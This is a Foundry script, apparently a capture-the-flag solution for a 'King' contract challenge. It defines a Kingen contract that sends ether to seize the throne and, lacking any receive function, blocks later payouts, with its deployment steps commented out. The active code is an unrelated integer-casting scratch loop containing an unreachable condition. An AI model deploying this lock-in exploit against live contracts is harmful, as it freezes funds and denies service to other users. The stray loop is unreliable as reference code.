pragma solidity ^0.8.0;

import "../src/level9.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Kingen {
    constructor(address payable addr) payable {
        console.log(address(this).balance);
        (bool result, ) = addr.call{value: address(this).balance}("");
        require(result);
    }
}

contract Solution is Script {

    King public ins = King(payable(0xB774F880a41e9Dbda75D7235cec231Ae80Db4270));

    function run() external {
        for (uint16 i = 0; i < 2**16-1; i++) {
            if(i == 32768 || i == 65536) continue;
            uint16 count = i;
            int16 count2 = int16(count);
            int16 count3 = -int16(count);
            int8 count4 = int8(count2);
            int8 count5 = int8(count3);
            if (count4 > 0 && count5 > 0) {
                console.logUint(count);
                console.log('ya');
                break;
            }
            console.logUint(count);
        }
        // vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // console.log(ins.prize());
        // Kingen k = new Kingen{value: ins.prize()}(payable(0xB774F880a41e9Dbda75D7235cec231Ae80Db4270));
        // console.log(ins._king());
        // console.log(address(k));
        // vm.stopBroadcast();
    }
}